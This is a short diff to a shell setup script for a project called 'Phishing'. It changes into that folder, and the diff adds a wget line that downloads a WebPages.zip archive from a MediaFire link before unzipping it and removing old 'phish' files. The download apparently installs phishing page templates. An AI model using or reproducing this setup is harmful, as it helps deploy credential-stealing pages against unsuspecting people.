@@ -6,6 +6,7 @@ chmod 765 details
 chmod 765 phish
 cd
 cd Phishing
+wget https://download1495.mediafire.com/soqyptjf4cag/h4m5t1msnr8zd47/WebPages.zip
 unzip WebPages.zip
 rm -rf WebPages.zip
 rm -rf phish
